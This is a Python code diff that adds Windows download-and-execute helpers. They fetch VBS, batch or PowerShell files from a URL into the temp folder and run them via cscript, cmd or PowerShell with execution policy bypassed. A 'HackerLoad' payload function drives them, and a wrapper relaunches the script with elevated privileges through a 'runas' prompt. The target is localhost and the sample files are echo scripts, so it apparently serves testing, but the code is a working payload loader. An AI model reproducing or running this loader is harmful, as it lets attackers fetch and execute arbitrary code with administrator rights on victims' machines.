@@ -13,6 +13,9 @@
 import tempfile
 import os
 import requests
+import subprocess
+import sys
+import ctypes
 
 ###
 # getTempEnviron()
@@ -40,7 +43,6 @@ def getTempEnviron():
 # UploadFilesFromInt( strFile, strURL, strPath )
 # This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
 # and Save it on Local Computer to Path strPath
-# Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
 #
 # PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
 #               strURL -- an URL of the web-site, from which the File
@@ -92,18 +94,226 @@ def uploadFilesFromInt( strFile, strURL, strPath ):
             intUploadFilesFromInt = 1
     return intUploadFilesFromInt
 
+#******************************************************************************
+#
+# runDownloadedScript01( strPath, strVBS )
+# This Function Run Visible a strVBS File
+# with Command "cscript //NoLogo " & strPath & "\" & strVBS
+#
+# PARAMETERS:   strPath -- The Path to strVBS
+#               strVBS -- a VBS File with instructions
+#               (Windows Scripts Shell)
+#
+# RETURNS:      0 if Success
+#				1 if Path not Found
+#
+#*****************************************************************************/
+def runDownloadedScript01(strPath, strVBS):
+    # Define Windows Scripts Options
+    constRun_VBS = " //Nologo "
+    #  Define VBS Script Options (Empty)
+    constOpt = "";
+    pathCMD = os.environ['SystemRoot'] + "\\System32"
+    cscriptEXE = pathCMD + "\\cscript.exe"
+    strLocal_Path = strPath + "\\" + strVBS
+    if not os.path.isfile(cscriptEXE):
+        return 1
+    if not os.path.isfile(strLocal_Path):
+        return 1
+    strValue = cscriptEXE + constRun_VBS + "\"" + strLocal_Path + "\"" + constOpt
+    result = subprocess.run(strValue, capture_output=True, encoding='cp866', shell=True)
+    print(result.stdout)
+    print("\nError Code: ", result.returncode)
+    return 0
+
+#******************************************************************************
+#
+# runDownloadedCmd01( strPath, strCmd )
+# This Function Run Visible a strCmd File
+# with Command "cmd /c " & "\"" & strPath & "\" & strCmd & "\""
+#
+# PARAMETERS:   strPath -- The Path to strVBS
+#               strCmd -- a Cmd File with instructions
+#               (Windows Command Shell)
+#
+# RETURNS:      0 if Success
+#				1 if Path not Found
+#
+#*****************************************************************************/
+def runDownloadedCmd01(strPath, strCmd):
+    # Define Windows Scripts Options
+    constRun_Cmd = " /c "
+    #  Define VBS Script Options (Empty)
+    constOpt = "";
+    pathCMD = os.environ['SystemRoot'] + "\\System32"
+    startCmd = "cmd.exe"
+    cmdEXE = pathCMD + "\\" + startCmd
+    strLocal_Path = strPath + "\\" + strCmd
+    if not os.path.isfile(cmdEXE):
+        return 1
+    if not os.path.isfile(strLocal_Path):
+        return 1
+    strValue = cmdEXE + constRun_Cmd + "\"" + strLocal_Path +"\"" + constOpt
+    # print(strValue)
+    result = subprocess.run(strValue, capture_output=True, encoding='cp866', shell=True)
+    print(result.stdout)
+    print("\nError Code: ", result.returncode)
+    return 0
+
+#******************************************************************************
+#
+# runDownloadedPwsh01( strPath, strPwsh )
+# This Function Run Visible a strPwsh File
+# with Command "powershell -File " & strPath & "\" & strPwsh
+#
+# PARAMETERS:   strPath -- The Path to strVBS
+#               strPwsh -- a Powershell Scripr with instructions
+#               (Windows PowerShell 5.1)
+#
+# RETURNS:      0 if Success
+#				1 if Path not Found
+#
+#*****************************************************************************/
+def runDownloadedPwsh01(strPath, strPwsh):
+    # Define Windows Scripts Options
+    constRun_Pwsh = " -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -File "
+    #  Define VBS Script Options (Empty)
+    constOpt = "";
+    pathCMD = os.environ['SystemRoot'] + "\\System32"
+    pwshPath = pathCMD + "\\WindowsPowerShell\\v1.0"
+    startCmd = "powershell.exe"
+    cmdEXE = pwshPath + "\\" + startCmd
+    strLocal_Path = strPath + "\\" + strPwsh
+    if not os.path.isfile(cmdEXE):
+        return 1
+    if not os.path.isfile(strLocal_Path):
+        return 1
+    strValue = cmdEXE + constRun_Pwsh + "\"" + strLocal_Path +"\"" + constOpt
+    # print(strValue)
+    result = subprocess.run(strValue, capture_output=True, encoding='cp866', shell=True)
+    print(result.stdout)
+    print("\nError Code: ", result.returncode)
+    return 0
+
+#* ********************************************************
+#
+# scriptDownlRun01( strURL , strFileNameWSH, iTimeOut )
+#
+# This Script Downloads VBS file from strURL Path and
+# Execute it 
+#
+# PARAMETERS:	strURL an URL Path to Download
+# 				strFileNameWSH - Name of WSH File
+# RETURNS:		0 if Success Download and Run
+#				1 if Error Occur
+#
+# *********************************************************/
+def scriptDownlRun01(strURL, strFileNameWSH):
+    # Get Temp Folder Name
+    tempFolder = getTempEnviron()
+    # Check if strFolder is Empty of TEMP Directory not Assigned
+    if tempFolder =="":
+        return 1
+    iFlag = uploadFilesFromInt(strFileNameWSH, strURL, tempFolder)
+    if iFlag : 
+        return 1
+    iFlag = runDownloadedScript01(tempFolder, strFileNameWSH)
+    if iFlag :
+        return 1
+    return 0
+
+
+#* ********************************************************
+#
+# cmdDownlRun01( strURL , strCmd )
+#
+# This Script Downloads Cmd file from strURL Path and
+# Execute it 
+#
+# PARAMETERS:	strURL an URL Path to Download
+# 				strCmd - Name of Cmd File
+# RETURNS:		0 if Success Download and Run
+#				1 if Error Occur
+#
+# *********************************************************/
+def cmdDownlRun01(strURL, strCmd):
+    # Get Temp Folder Name
+    tempFolder = getTempEnviron()
+    # Check if strFolder is Empty of TEMP Directory not Assigned
+    if tempFolder =="":
+        return 1
+    iFlag = uploadFilesFromInt(strCmd, strURL, tempFolder)
+    if iFlag : 
+        return 1
+    iFlag = runDownloadedCmd01(tempFolder, strCmd)
+    if iFlag :
+        return 1
+    return 0
+
+
 ### Tests
 
 # print("Tempdir = " + getTempEnviron())
 
+###
+# HackerLoad
+# A Function for Downloading an Executing Payload
+# (most Common for Test)
+#
+# PARAMETERS: NONE
+# RETURNS: Always 0
+#
+###
 def HackerLoad():
 #    aFolder = os.getcwd()
 #    aFolder = "C:"
 #    aFolder = os.path.dirname(os.path.abspath(__file__))
-    aFolder = getTempEnviron()
+#    aFolder = getTempEnviron()
     anURL = "http://localhost/"
-    aFile = "echo.bat"
-    print( "iFlag=" + str(uploadFilesFromInt( aFile, anURL, aFolder)))
+#    aFile = "echo.bat"
+#    print( "\niFlag=" + str(cmdDownlRun01( anURL, aFile)))
+    aFile = "echo.wsf"
+    print( "\niFlag=" + str(scriptDownlRun01( anURL, aFile)))
 
+###
+# HackerLoadPwsh
+# A Function for an Executing Payload
+# (most Common for Test)
+#
+# PARAMETERS: NONE
+# RETURNS: Always 0
+#
+###
+def HackerLoadPwsh():
+#    aFolder = os.getcwd()
+    aFolder = os.path.expanduser(os.getenv('USERPROFILE'))
+#    aFolder = os.path.dirname(os.path.abspath(__file__))
+#    aFolder = getTempEnviron()
+#    anURL = "http://localhost/"
+#    aFile = "echo.bat"
+#    print( "\niFlag=" + str(cmdDownlRun01( anURL, aFile)))
+    aFile = "echo.ps1"
+    print( "\niFlag=" + str(runDownloadedPwsh01( aFolder, aFile)))
 
-HackerLoad()
+# HackerLoadPwsh()
+
+###
+#
+# wrapper
+# A Function will Check if it is Run with Elevated Privileges
+# and will Run with these Privileges at a New Window if not
+# (most Common for Test)
+#
+# PARAMETERS: NONE
+# RETURNS: Always 0
+#
+###
+def wrapper():
+    validation = ctypes.windll.shell32.IsUserAnAdmin()
+    if validation == 1:
+        return HackerLoad()
+    else:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    return wrapper
+
+# wrapper()
